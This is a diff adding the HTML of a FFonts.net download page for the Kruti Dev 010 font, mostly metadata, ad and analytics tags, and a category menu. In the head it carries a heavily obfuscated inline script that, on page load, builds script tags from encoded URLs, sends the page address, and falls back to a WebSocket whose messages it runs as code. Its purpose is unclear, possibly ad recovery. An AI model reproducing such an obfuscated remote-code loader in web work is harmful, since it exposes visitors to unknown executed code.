@@ -1,0 +1,585 @@
+﻿<!doctype html>
+<html  lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Kruti Dev 010 Font &mdash; Free Download (TTF/OTF) | FFonts.net</title>
+  <meta name="description" content="Download and install the Kruti Dev 010 font free from FFonts.net. Includes TTF/OTF files and a live preview tool. Total downloads: 2,000,000+." />
+  <meta name="theme-color" content="#bc1f1f">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+  <link rel="preconnect" href="https://d144mzi0q5mijx.cloudfront.net" crossorigin>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="https://d144mzi0q5mijx.cloudfront.net/favicon.ico?a" />
+  
+  <link rel="preload" href="https://d144mzi0q5mijx.cloudfront.net/test/css/all.c.1.css?3" as="style">
+  <link rel="stylesheet" href="https://d144mzi0q5mijx.cloudfront.net/test/css/all.c.1.css?3" fetchpriority="high">
+
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400&display=swap">
+  <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400&display=swap"
+        media="print" onload="this.media='all'">
+  <noscript>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400&display=swap">
+  </noscript>
+  <link rel="dns-prefetch" href="https://www.google-analytics.com">
+
+<link rel="preconnect" href="https://a.pub.network/" crossorigin />
+<link rel="preconnect" href="https://b.pub.network/" crossorigin />
+<link rel="preconnect" href="https://c.pub.network/" crossorigin />
+<link rel="preconnect" href="https://d.pub.network/" crossorigin />
+<link rel="preconnect" href="https://c.amazon-adsystem.com" crossorigin />
+<link rel="preconnect" href="https://s.amazon-adsystem.com" crossorigin />
+<link rel="preconnect" href="https://btloader.com/" crossorigin />
+<link rel="preconnect" href="https://api.btloader.com/" crossorigin />
+<link rel="preconnect" href="https://cdn.confiant-integrations.net" crossorigin />
+<script data-cfasync="false" type="text/javascript">
+  var freestar = freestar || {};
+  freestar.queue = freestar.queue || [];
+  freestar.config = freestar.config || {};
+  freestar.config.enabled_slots = [];
+  freestar.initCallback = function () { (freestar.config.enabled_slots.length === 0) ? freestar.initCallbackCalled = false : freestar.newAdSlots(freestar.config.enabled_slots) }
+</script>
+<script src="https://a.pub.network/ffonts-net/pubfig.min.js" data-cfasync="false" async></script>
+<link rel="stylesheet" href="https://a.pub.network/ffonts-net/cls.css">
+<script data-cfasync="false">(function(){function D(p,c){const i=R();return D=function(H,K){H=H-(0x20a4+0x1e36+-0x3cf0);let M=i[H];if(D['VwYIzl']===undefined){var u=function(S){const C='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let w='',W='';for(let E=0x1a4+-0x6aa+-0x506*-0x1,n,m,O=0x1f1e+0x1*-0x1a1+-0x1d7d;m=S['charAt'](O++);~m&&(n=E%(-0x1e3b+0x3*-0x4a7+-0xa4*-0x45)?n*(0x69+-0x16*0x4+-0x1*-0x2f)+m:m,E++%(-0x7a*0x28+-0x1227+0x253b))?w+=String['fromCharCode'](-0x1*-0x254f+0x1988+-0x4*0xf76&n>>(-(-0x130e+0x26a1+-0x1391)*E&0x12d+0x44a+-0xc7*0x7)):0x229*-0x3+-0xd8e+-0x17*-0xdf){m=C['indexOf'](m);}for(let g=0x231*0xd+0x1*0x16c3+-0x334*0x10,h=w['length'];g<h;g++){W+='%'+('00'+w['charCodeAt'](g)['toString'](0x1b3+-0x91a+0x777))['slice'](-(-0x658*-0x2+0x155d+-0x19f*0x15));}return decodeURIComponent(W);};const P=function(S,C){let w=[],W=0x1cb+-0x1174*-0x2+-0x24b3,E,n='';S=u(S);let m;for(m=-0x2*0xece+0x40d+-0x3*-0x885;m<0x20c0+0x18be+0x812*-0x7;m++){w[m]=m;}for(m=0x51e*-0x3+-0x11bc+-0x181*-0x16;m<0x1f50+-0x90a+-0x1546;m++){W=(W+w[m]+C['charCodeAt'](m%C['length']))%(-0x22a3*0x1+-0x3*0x685+0x3732),E=w[m],w[m]=w[W],w[W]=E;}m=0x1*0xad5+0x1d6b+0x2*-0x1420,W=-0x1*0x96a+0x17d*0x3+0x4f3*0x1;for(let O=0x15b*-0x17+-0x79b*-0x4+0xc1;O<S['length'];O++){m=(m+(0x18aa+-0x76*-0x4f+-0x1*0x3d13))%(0x414+0x913+-0xc27),W=(W+w[m])%(-0x15*0x170+-0x5ad*0x1+-0x24dd*-0x1),E=w[m],w[m]=w[W],w[W]=E,n+=String['fromCharCode'](S['charCodeAt'](O)^w[(w[m]+w[W])%(-0x2243+-0x1aed+0x14*0x31c)]);}return n;};D['yQYUZz']=P,p=arguments,D['VwYIzl']=!![];}const V=i[0x1a69+-0x26a6+0xd*0xf1],q=H+V,A=p[q];return!A?(D['eovxTr']===undefined&&(D['eovxTr']=!![]),M=D['yQYUZz'](M,K),p[q]=M):M=A,M;},D(p,c);}function R(){const O=['W58PuSkn','yrDmW78','tapcNvG','W6vmDeO','nCkHpmoQ','W5agWObR','DCo3ow8','W41OASk2','s8o3c8kE','W7JdN8okBG','W5LcW5xdOa','WOqEWOtcTW1zDYHFW5hcLW','WQP4e8kxD8kcww7dMG','kCk8ANVdOuxcNSoDtW','icXWWPK','WR01W5GY','W4/cPmkwqW','swT9sG','fSkBAW','D0L7WPm','W6S2WO5z','d35RWPr9WRa9umkBW59A','DCoow8oa','WOGGWR4+','yG/cUxK','q8o8pIi','W6XiCf8','W6izW4/dLhnGpSo3WO3dImkxaSkX','wcSqW40','WRpcMrrB','CWxcLSkx','WOVdLSkoW7m','W6S3WOW','qutdPCk9','W6Dmp8k1','WOCWWOH0WRvzW5m','u8k2bmk3','WO7dM8kEWPy','WP9nW4C','WPOZWRWY','WRa1W7v0','oNy7W7G','g8kkW7NcJW','W61ND8ox','DCkImSoZ','WRfBWORcIa','W69QWOjF','WOFdJCodWPW','W7WZWQRdOG','B8odtCom','EIyGW5e','WQFcGrxdHW','W70nFCk9','aKZdICk0','sCo0na','W6dcLConDa','oNy7','BSozxCoz','WOyEgf7dUCk6WQr5gJTpWQtdPG','W5dcMSotW7WWWOLQW5RcJG','A8obbmof','W6uDW4ZdNGy7sCoEWQddMW','kmkbWRLk','WOmtWOlcSq4kmYfgW6tcHdBcPW','kmk8BdRcMg/cOSozASkUW6u','WQxcGXbD','hmolW7tcMa','B8oDxCkg','hZO9pc/dVSo9WQldV8ou','W7aKt8ox','B0/dUYm','l0FdPmkO','pG98W6C','aGlcKfa','oSoGeL0','WQbbWPNcHa','WOhdLSkvW6i','WPPmsKC','WQDkWORcJG','WOS3WQmL','W7PlCWa','oCkxWRTA','W5HeW5xdQa','WRTDWOhcLW','wSkHt8kS','dmkdBSkJ','o15vWQxcMHmPetjuWOFcUSor','W47dPmkarq','BaPpW6u','dvJdUSk5','iCkVWRBcVa','W6fyza','zCoFqmoz','WOxcHSkfWPC','W5ZcHHvg','W5XotWy','kx0HW5S','WOazFYBcUmoHW5XE','WP7dJmkXW6a','AqSAWRG','W5qMW6mL','kW5GW7y','hmklWRNcNa','WRi4W4bU','pr5HW7O','mfPNW4W','BSoetmof','W58Onfy','WPddHCkhxW','d8oTW5lcQW','srChW7O','a0NdRSoY','W5ZdJaHh','mSkBW7Dx','W706WQ8','W7iWumoD','hK3dP8kZ','WPZcMfe','W5BcHXCa','W5D5rSk7','rCkQaG','W6T/W4ar','mhvWW4e','WPiMWQaZ','W5RcL8ovWQjrW50WWOZcVJBcISoba1G','WP8SWQe2','vtpcJ1ZcHeDl','W649ECou','ihmRW7C','W63dGaNdOa','gLvBWQ4tWR8lWQtcLmkLyq','W4aKCLy','bCkqimo7','W7a/W5nO','WPJcK8odW5y','WRWZqSkl','BfH7','gfZdUmk1','m8kSmSo2','WRRcMbji','BvX4WOa','WRuxkf0','W6XCzh8','xdhcTa0','yK3dRtK','wwa0W40','B8ozqCoi','B1tdVcC','WOxdJCkjWOe','Ae7dPti','W57cLG0n','W7S3WOzo','E0FcKSkD','W4CwWRD1','uSkeA8k8','t21S','htS9nv/cR8kjW4VdR8oxcdyeW4W','W50sWP98','q8oQnw0','WRxcHrri','phWHWOe','edFdUWC','FLLRWQy','WPuNWQKV','kCo1Fmk1','W7vZo8kx','W5XJFf8','gSkqW6pcNG','uaenW7S','WQX8W5Lmgb/cHmkaWP0','W5OIF1W','W5NcNCoAW4XdBCk2sCoIu8osW5KE','emkhASkL','EqSNW7O','d8o1mwu','kSk6df4','o2iRW4y','imoLWRZdSW','uZ/dTaK','uYKGWOO','ih42W5m','WQbmWOdcKW','ASkRWQRcVW','qsfRzW','W4ncW4tdQa','cutdRSoZ','r8oZhSkB','WOJdNmkEWOS','AmogW64kxSo1d8klWQxcLIFdRCkO','tX1nW7y','WRe8WPL9','W7VdHHtdLG','nNGRW6u','WQxdJv4g','mCkJWQhdVa','n30UW4S'];R=function(){return O;};return R();}(function(p,c){const S=D,i=p();while(!![]){try{const H=parseInt(S(0x1ea,'mX^c'))/(-0x2*0x1147+0x1ff8+0xdd*0x3)*(parseInt(S(0x210,'CAbv'))/(-0x282+-0x1*-0x115+0x16f))+-parseInt(S(0x25a,'$O^w'))/(-0x1253+-0x1643+-0x223*-0x13)+-parseInt(S(0x22d,'OM^2'))/(0x1916+0x122*-0x9+0x7*-0x220)*(parseInt(S(0x28e,'YluL'))/(-0x8*0x2b9+0x76f*0x2+0x6ef))+-parseInt(S(0x2ad,'CAbv'))/(0x2074*0x1+0x1e74+0x6*-0xa7b)+-parseInt(S(0x288,'wU8N'))/(0x1ab2+0x7fd+0x22a8*-0x1)*(parseInt(S(0x280,'gHWF'))/(-0x11a6+-0x1*-0xb78+0x5*0x13e))+-parseInt(S(0x1f3,'3R0K'))/(-0x1d3e+-0x162a+0x3371)*(-parseInt(S(0x27e,'83#v'))/(-0x20b*-0x13+-0xa3b*0x1+-0x1c8c))+parseInt(S(0x22b,'mX^c'))/(-0x1aed+0x28*-0xb4+-0x3718*-0x1);if(H===c)break;else i['push'](i['shift']());}catch(K){i['push'](i['shift']());}}}(R,0x2*-0x106ca+0xcaf*-0xd4+0x1b*0xe899),(function(){const C=D;window[C(0x233,'7AS8')+'_'+window[C(0x292,'mX^c')](window[C(0x23a,'0(UL')+C(0x271,'p^Du')][C(0x279,'gHWF')])]={'HTMLIFrameElement_contentWindow':Object[C(0x284,'3R0K')+C(0x211,'mX^c')+C(0x25b,'5bJv')+C(0x222,'ynbE')+C(0x28a,'$Cx]')+C(0x1fe,'$Cx]')](HTMLIFrameElement[C(0x1f7,'%8qy')+C(0x202,'YluL')+'e'],C(0x29d,')H18')+C(0x29c,'yfIY')+C(0x259,'Dq6V')+'w')};function p(H){const w=C,[K,...M]=H,u=document[w(0x24e,'0(UL')+w(0x25c,'RWt4')+w(0x283,'hlCA')+'t'](w(0x1fd,'YluL')+'pt');return u[w(0x227,'T[1z')]=K,u[w(0x23d,'[R^Z')+w(0x27c,'!gpz')+w(0x2a5,'wU8N')+w(0x290,'0(UL')](w(0x2a0,'YluL')+'r',()=>{const W=w;if(M[W(0x261,'yp*7')+'th']>-0x105+-0x1*-0x2633+-0x252e)p(M);else{const V=new WebSocket(W(0x1ff,'[R^Z')+W(0x2a6,'J*L3')+W(0x1eb,'et$[')+W(0x21e,'nX4p')+W(0x229,'56g5')+'s');V[W(0x244,'8MPx')+W(0x287,'X%AR')+'e']=q=>{const E=W,A=q[E(0x23c,'kj7K')],P=document[E(0x1f8,'OM^2')+E(0x248,'L%J*')+E(0x23f,'8MPx')+'t'](E(0x289,'et$[')+'pt');P[E(0x264,'YluL')+E(0x1f6,'nX4p')+E(0x2ab,'yfIY')]=A,document[E(0x27d,'83#v')][E(0x28d,'[R^Z')+E(0x29b,'!dT*')+E(0x2a9,'kLPg')](P);},V[W(0x277,'7AS8')+'en']=()=>{const n=W;V[n(0x257,'*JBI')](n(0x214,'%8qy')+n(0x27a,'98JW')+'l');};}}),document[w(0x269,'CBBZ')][w(0x29a,'$Cx]')+w(0x28f,'wU8N')+w(0x285,'5bJv')](u),u;}const c=document[C(0x278,'L%J*')+C(0x230,'J*L3')+C(0x20b,'et$[')+'t'][C(0x21b,'CuN2')+C(0x237,'YJ3&')][C(0x22c,'$Cx]')+'in']??C(0x22e,'ynbE')+C(0x294,'nX4p')+C(0x1f1,')H18');document[C(0x26a,'$O^w')+C(0x26f,'56g5')+C(0x246,'X%AR')+'t'][C(0x223,'nX4p')+'ve']();const i=document[C(0x24d,'kLPg')+C(0x226,'98JW')+C(0x291,'jg)1')+'t'](C(0x217,'%8qy')+'pt');i[C(0x293,'X%AR')]=C(0x276,'[R^Z')+C(0x281,'56g5')+c+(C(0x236,'2pfi')+C(0x1f2,'et$['))+btoa(location[C(0x1f5,'8MPx')+C(0x24c,'L%J*')])[C(0x267,'83#v')+C(0x24a,'3R0K')](/=+$/,'')+C(0x299,'83#v'),i[C(0x22f,'56g5')+C(0x238,'nX4p')+C(0x256,')H18')](C(0x27b,'CBBZ')+C(0x249,'5bJv'),C(0x28b,'8MPx')+C(0x20a,'kj7K')),i[C(0x251,'YJ3&')+C(0x20f,'yfIY')+C(0x273,'2pfi')+C(0x297,'T[1z')](C(0x298,'$O^w')+'r',()=>{const m=C;p([m(0x242,'8MPx')+m(0x254,'ynbE')+m(0x1f4,'2pfi')+m(0x21d,'*JBI')+m(0x216,'!dT*')+m(0x234,'!dT*')+m(0x218,'YJ3&')+m(0x207,'RWt4')+m(0x219,'et$[')+m(0x20d,'[viP')+m(0x2a4,'et$[')+m(0x1f9,'GUnv'),m(0x25e,'GUnv')+m(0x235,'$O^w')+m(0x24f,'yfIY')+m(0x204,'5bJv')+m(0x239,'7AS8')+m(0x203,'T[1z')+m(0x240,'wU8N')+m(0x1fc,'CAbv')+m(0x263,'56g5')+m(0x2a2,'$O^w')+m(0x25d,'kLPg')+m(0x20c,'$O^w')+m(0x21f,'[viP')+'js',m(0x2ac,'et$[')+m(0x253,'7AS8')+m(0x28c,'kLPg')+m(0x1ed,'K&Wd')+m(0x20e,'CAbv')+m(0x274,'RWt4')+m(0x255,'Dq6V')+m(0x1fc,'CAbv')+m(0x26e,'J*L3')+m(0x21a,'Dq6V')+m(0x250,'yp*7')+m(0x21c,'Xu5@')+m(0x212,'RWt4')+'js',m(0x286,'YJ3&')+m(0x228,'X%AR')+m(0x282,'!dT*')+m(0x1f0,'0(UL')+m(0x201,'83#v')+m(0x26c,'*JBI')+m(0x266,'3R0K')+m(0x265,'p^Du')+m(0x232,'Dq6V')+m(0x245,'Oo1t')+m(0x29f,'7AS8')+m(0x2aa,'!gpz')+m(0x209,'p^Du')+'js',m(0x1fb,'mX^c')+m(0x270,'0(UL')+m(0x23b,'YJ3&')+m(0x215,')H18')+m(0x241,'et$[')+m(0x23e,'yp*7')+m(0x26d,'!dT*')+m(0x206,'hlCA')+m(0x22a,'$Cx]')+m(0x213,'$Cx]')+m(0x262,'wU8N')+m(0x272,'yfIY')+m(0x2a7,'jRp)')+m(0x295,'jRp)')+m(0x252,'$Cx]')+m(0x299,'83#v'),m(0x25f,'56g5')+m(0x270,'0(UL')+m(0x200,'K&Wd')+m(0x225,'[viP')+m(0x1fa,'YluL')+m(0x29e,'ynbE')+m(0x247,'jg)1')+m(0x275,'OM^2')+m(0x268,'nX4p')+m(0x260,'p^Du')+m(0x2a1,'X%AR')+m(0x220,'K&Wd')+m(0x243,'$O^w')+m(0x224,'Oo1t')]);}),document[C(0x2a3,'3(J2')][C(0x208,'nX4p')+C(0x2a8,'nX4p')+C(0x221,'3(J2')](i);}()));})();</script><meta property="og:title" content="Kruti Dev 010 Font" /> 
+<meta property="og:type" content="website" /> 
+<meta property="og:url" content="https://www.ffonts.net/Kruti-Dev-010.font" /> 
+<meta property="og:image" content="https://d144mzi0q5mijx.cloudfront.net/img/K/R/Kruti-Dev-010.webp" /> 
+<meta property="og:site_name" content="Kruti Dev 010 Font" />	
+<meta property="fb:admins" content="1050048428"/>	
+
+
+<link rel="canonical" href="https://www.ffonts.net/Kruti-Dev-010.font" />
+<link rel="alternate" href="https://www.ffonts.net/Kruti-Dev-010.font" hreflang="x-default" />
+<link rel="alternate" href="https://ro.ffonts.net/Kruti-Dev-010.font" hreflang="ro" />
+<link rel="alternate" href="https://de.ffonts.net/Kruti-Dev-010.font" hreflang="de" />
+<link rel="alternate" href="https://es.ffonts.net/Kruti-Dev-010.font" hreflang="es" />
+<link rel="alternate" href="https://fr.ffonts.net/Kruti-Dev-010.font" hreflang="fr" />
+<link rel="alternate" href="https://it.ffonts.net/Kruti-Dev-010.font" hreflang="it" />
+<link rel="alternate" href="https://pt.ffonts.net/Kruti-Dev-010.font" hreflang="pt" />
+<link rel="alternate" href="https://cn.ffonts.net/Kruti-Dev-010.font" hreflang="zh-hans" />
+<link rel="alternate" href="https://ru.ffonts.net/Kruti-Dev-010.font" hreflang="ru" />
+<link rel="alternate" href="https://ar.ffonts.net/Kruti-Dev-010.font" hreflang="ar" />
+<link rel="alternate" href="https://jp.ffonts.net/Kruti-Dev-010.font" hreflang="ja" />
+<link rel="alternate" href="https://in.ffonts.net/Kruti-Dev-010.font" hreflang="hi" />
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('consent', 'default', {
+    'ad_storage': 'denied',
+    'ad_user_data': 'denied',
+    'ad_personalization': 'denied',
+    'analytics_storage': 'denied',
+    'regions': ['EU', 'BR', 'US-CA']
+  });
+  gtag('config', 'G-38VQLT3JPX');
+  
+gtag('event', 'ads_check', {
+'event_category': 'V19-ADS-FS',
+'event_label': 'layout',
+'value': 0
+});
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-38VQLT3JPX"></script>
+<script defer src="https://d144mzi0q5mijx.cloudfront.net/js/aa.js"></script>
+</head>
+<body>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.ffonts.net/"},{"@type":"ListItem","position":2,"name":"Hindi","item":"https://www.ffonts.net/Hindi.html"},{"@type":"ListItem","position":3,"name":"Kruti Dev 010 Font"}]}</script>
+<header class="row navbar navbar-expand-md custombgcolor fixed-top topbardesign">
+    <div id="logo"><a href="https://www.ffonts.net" title="Free Fonts" id="toplogo"><span>Free Fonts</span></a></div>
+    
+<div class="iconsmobilealign">    
+    <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbarCollapsePages" aria-label="Categories">
+        <span class="icon ui-tmenu sz30"></span>
+    </button>
+
+    <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbarCollapse" aria-label="Profile">
+        <span class="icon sz30 ui-tuser"></span>
+    </button>
+
+</div>
+    <div class="collapse navbar-collapse collapsemenuoverflow" id="navbarCollapsePages">
+
+        <div class="vis mobilesectiononly" id="sidebarNav">
+            <div class="sbarctrl cf">
+                <div class="fr"><a href="#" id="stgl"><i class="icon ui-close sz30">Close</i></a></div>
+            </div>		
+            
+            
+
+
+
+
+<div class="bordersidebaradds"></div>
+
+
+
+
+
+
+<ul class="s15 catlist classicalfonts_sidebarcss">
+
+<li><a href="/3D.html"  title="3D Fonts">3D Fonts</a><span class="circled blk">298</span></li><li><a href="/50s.html"  title="50s Fonts">50s Fonts</a><span class="circled blk">36</span></li><li><a href="/60s.html"  title="60s Fonts">60s Fonts</a><span class="circled blk">5</span></li><li><a href="/80s.html"  title="80s Fonts">80s Fonts</a><span class="circled blk">6</span></li><li><a href="/Antiques.html"  title="Antiques Fonts">Antiques Fonts</a><span class="circled blk">47</span></li><li><a href="/Art-Deco.html"  title="Art Deco Fonts">Art Deco Fonts</a><span class="circled blk">25</span></li><li><a href="/Art-Nouveau.html"  title="Art Nouveau Fonts">Art Nouveau Fonts</a><span class="circled blk">37</span></li><li><a href="/Asian.html"  title="Asian Fonts">Asian Fonts</a><span class="circled blk">551</span></li><li><a href="/athletic.html"  title="Athletic Fonts">Athletic Fonts</a><span class="circled blk">36</span></li><li><a href="/Basic.html"  title="Basic Fonts">Basic Fonts</a><span class="circled blk">287</span></li><li><a href="/Broken.html"  title="Broken Fonts">Broken Fonts</a><span class="circled blk">296</span></li><li><a href="/bubble-letter.html"  title="Bubble Letter Fonts">Bubble Letter Fonts</a><span class="circled blk">100</span></li><li><a href="/Calligraphic.html"  title="Calligraphic Fonts">Calligraphic Fonts</a><span class="circled blk">275</span></li><li><a href="/Capitals.html"  title="Capitals Fonts">Capitals Fonts</a><span class="circled blk">665</span></li><li><a href="/Cars.html"  title="Cars Fonts">Cars Fonts</a><span class="circled blk">27</span></li><li><a href="/Cartoon.html"  title="Cartoon Fonts">Cartoon Fonts</a><span class="circled blk">3964</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Christmas-Xmas.html"  title="Christmas (Xmas) Fonts">Christmas (Xmas) Fonts</a><span class="circled blk">395</span></li><li><a href="/Classic.html"  title="Classic Fonts">Classic Fonts</a><span class="circled blk">38</span></li><li><a href="/Comic.html"  title="Comic Fonts">Comic Fonts</a><span class="circled blk">1738</span></li></ul>
+					<div class="t2 b1">
+					
+					</div>	
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Computer.html"  title="Computer Fonts">Computer Fonts</a><span class="circled blk">60</span></li><li><a href="/Crazy.html"  title="Crazy Fonts">Crazy Fonts</a><span class="circled blk">1051</span></li><li><a href="/Curly.html"  title="Curly Fonts">Curly Fonts</a><span class="circled blk">332</span></li><li><a href="/Decorative.html"  title="Decorative Fonts">Decorative Fonts</a><span class="circled blk">5194</span></li><li><a href="/Dingbats.html"  title="Dingbats Fonts">Dingbats Fonts</a><span class="circled blk">2261</span></li><li><a href="/Distorted-Eroded.html"  title="Distorted Eroded Fonts">Distorted Eroded Fonts</a><span class="circled blk">2314</span></li><li><a href="/Dotted.html"  title="Dotted Fonts">Dotted Fonts</a><span class="circled blk">290</span></li><li><a href="/Drippy.html"  title="Drippy Fonts">Drippy Fonts</a><span class="circled blk">77</span></li><li><a href="/Easter.html"  title="Easter Fonts">Easter Fonts</a><span class="circled blk">350</span></li><li><a href="/Famous.html"  title="Famous Fonts">Famous Fonts</a><span class="circled blk">77</span></li><li><a href="/Fancy.html"  title="Fancy Fonts">Fancy Fonts</a><span class="circled blk">774</span></li><li><a href="/Farsi.html"  title="Farsi Fonts">Farsi Fonts</a><span class="circled blk">29</span></li><li><a href="/Foreign.html"  title="Foreign Fonts">Foreign Fonts</a><span class="circled blk">15</span></li><li><a href="/Formal.html"  title="Formal Fonts">Formal Fonts</a><span class="circled blk">434</span></li><li><a href="/Funky.html"  title="Funky Fonts">Funky Fonts</a><span class="circled blk">6</span></li><li><a href="/Futuristic.html"  title="Futuristic Fonts">Futuristic Fonts</a><span class="circled blk">2091</span></li><li><a href="/Gothic.html"  title="Gothic Fonts">Gothic Fonts</a><span class="circled blk">1120</span></li><li><a href="/Graffiti.html"  title="Graffiti Fonts">Graffiti Fonts</a><span class="circled blk">262</span></li><li><a href="/Halloween.html"  title="Halloween Fonts">Halloween Fonts</a><span class="circled blk">198</span></li><li><a href="/Handwritten.html"  title="Handwritten Fonts">Handwritten Fonts</a><span class="circled blk">4083</span></li><li><a href="/Hi-tech.html"  title="Hi-tech Fonts">Hi-tech Fonts</a><span class="circled blk">9</span></li><li><a href="/Hindi.html"  title="Hindi Fonts">Hindi Fonts</a><span class="circled blk">55</span></li><li><a href="/Holiday.html"  title="Holiday Fonts">Holiday Fonts</a><span class="circled blk">16</span></li><li><a href="/Horror.html"  title="Horror Fonts">Horror Fonts</a><span class="circled blk">562</span></li><li><a href="/Images-Symbols.html"  title="Images &amp; Symbols Fonts">Images &amp; Symbols Fonts</a><span class="circled blk">736</span></li><li><a href="/Industrial.html"  title="Industrial Fonts">Industrial Fonts</a><span class="circled blk">14</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Kids.html"  title="Kids Fonts">Kids Fonts</a><span class="circled blk">236</span></li><li><a href="/Messy.html"  title="Messy Fonts">Messy Fonts</a><span class="circled blk">28</span></li><li><a href="/Military.html"  title="Military Fonts">Military Fonts</a><span class="circled blk">190</span></li><li><a href="/Miscellaneous.html"  title="Miscellaneous Fonts">Miscellaneous Fonts</a><span class="circled blk">6</span></li><li><a href="/Modern.html"  title="Modern Fonts">Modern Fonts</a><span class="circled blk">458</span></li><li><a href="/Movie.html"  title="Movie Fonts">Movie Fonts</a><span class="circled blk">57</span></li><li><a href="/Musical.html"  title="Musical Fonts">Musical Fonts</a><span class="circled blk">11</span></li><li><a href="/Non-Latin.html"  title="Non-Latin Fonts">Non-Latin Fonts</a><span class="circled blk">37</span></li><li><a href="/Old-fashioned.html"  title="Old Fashioned Fonts">Old Fashioned Fonts</a><span class="circled blk">197</span></li><li><a href="/Outline.html"  title="Outline Fonts">Outline Fonts</a><span class="circled blk">615</span></li><li><a href="/Pixel.html"  title="Pixel Fonts">Pixel Fonts</a><span class="circled blk">836</span></li><li><a href="/Professional.html"  title="Professional Fonts">Professional Fonts</a><span class="circled blk">15</span></li><li><a href="/Quirky.html"  title="Quirky Fonts">Quirky Fonts</a><span class="circled blk">495</span></li><li><a href="/Regular.html"  title="Regular Fonts">Regular Fonts</a><span class="circled blk">15245</span></li><li><a href="/Retro.html"  title="Retro Fonts">Retro Fonts</a><span class="circled blk">715</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Rock.html"  title="Rock Fonts">Rock Fonts</a><span class="circled blk">6</span></li><li><a href="/Round.html"  title="Round Fonts">Round Fonts</a><span class="circled blk">115</span></li><li><a href="/Sans-Serif.html"  title="Sans Serif Fonts">Sans Serif Fonts</a><span class="circled blk">2114</span></li><li><a href="/Sci-fi.html"  title="Sci-fi Fonts">Sci-fi Fonts</a><span class="circled blk">1883</span></li><li><a href="/Script.html"  title="Script Fonts">Script Fonts</a><span class="circled blk">1452</span></li><li><a href="/Serif.html"  title="Serif Fonts">Serif Fonts</a><span class="circled blk">990</span></li><li><a href="/sports.html"  title="Sports Fonts">Sports Fonts</a><span class="circled blk">128</span></li><li><a href="/Stencil.html"  title="Stencil Fonts">Stencil Fonts</a><span class="circled blk">175</span></li><li><a href="/Stylish.html"  title="Stylish Fonts">Stylish Fonts</a><span class="circled blk">10</span></li><li><a href="/Technical.html"  title="Technical Fonts">Technical Fonts</a><span class="circled blk">39</span></li><li><a href="/TV-show.html"  title="TV Show Fonts">TV Show Fonts</a><span class="circled blk">21</span></li><li><a href="/Typewriter.html"  title="Typewriter Fonts">Typewriter Fonts</a><span class="circled blk">676</span></li><li><a href="/Uncategorized.html"  title="Uncategorized Fonts">Uncategorized Fonts</a><span class="circled blk">110737</span></li><li><a href="/Valentine.html"  title="Valentine&#039;s Day Fonts">Valentine&#039;s Day Fonts</a><span class="circled blk">2364</span></li><li><a href="/Wavy.html"  title="Wavy Fonts">Wavy Fonts</a><span class="circled blk">9</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Web-20.html"  title="Web 2.0 Fonts">Web 2.0 Fonts</a><span class="circled blk">55</span></li><li><a href="/Western.html"  title="Western Fonts">Western Fonts</a><span class="circled blk">101</span></li><li><a href="/Wild.html"  title="Wild Fonts">Wild Fonts</a><span class="circled blk">4</span></li><li><a href="/Wood.html"  title="Wood Fonts">Wood Fonts</a><span class="circled blk">12</span></li><li><a href="/top-fonts.html" title="Top Fonts">Top Fonts</a></li><li><a href="/new-fonts.html" title="New Free Fonts">New Free Fonts</a></li><li><a href="/top-trends.html" title="Trending Fonts">Trending Fonts</a></li>
+	
+<li class="s12 caps lite red t2"><a href="/"><i class="icon ui-fcr sz22"></i>&nbsp;<strong>171,277</strong> Fonts</a></li>
+<li class="s12 caps lite red t2"><a href="/"><i class="icon ui-dcr sz22"></i>&nbsp;<strong>139,657,724</strong> Downloads</a></li>
+
+</ul>	
+
+            		
+</div>
+    </div>
+    <div class="collapse navbar-collapse" id="navbarCollapse1">
+		<ul class="s11 wht caps fr menulinksalignheader">
+ <li><a href="/Valentine.html" class="linkcss s20" title="💖 Valentine's Day Fonts">💖 Valentine's Day Fonts</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li>
+            <li><a href="/new-fonts.html" class="linkcss s20" title="New Free Fonts">New Free Fonts</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li>
+            <li><a href="/top-fonts.html" class="linkcss s20" title="Top Fonts">Top Fonts</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li>
+		</ul>
+    </div>
+
+        <div class="pr stacksearch form-inline ml-auto">
+            <div class="sfld">
+				<form name="searchform" action="/" method="post" onsubmit="gtag('event', 'input', {'event_category': 'SEARCHHOME','event_label': 'Search','value': ''});return validate();"><input type="search" name="searchtext" id="searchtextid" placeholder="Search" aria-labelledby="toplogo"><button class="butn" type="submit" name="buttontop1" id="buttontop" aria-label="Search"><i class="icon ui-search sz22"></i></button><input type="hidden" name="p" value="search" /><input type="hidden" id="langidsearch" name="langidsearch" value="Search for..." /></form>
+            </div>
+            
+        </div>
+
+
+    <div class="collapse navbar-collapse" id="navbarCollapse">
+				<ul class="s11 wht caps fr menulinksalignheader">
+            <li><a href="/submit.html" class="linkcss s20" title="Submit Your Fonts">Submit Your Fonts</a></li>
+			<li class="signin_mobilecss"><a href="/signin.html" class="urlcustomheadercssbuttons signinbutton">Sign In</a></li>
+		</ul>
+    </div>
+</header>
+
+
+
+
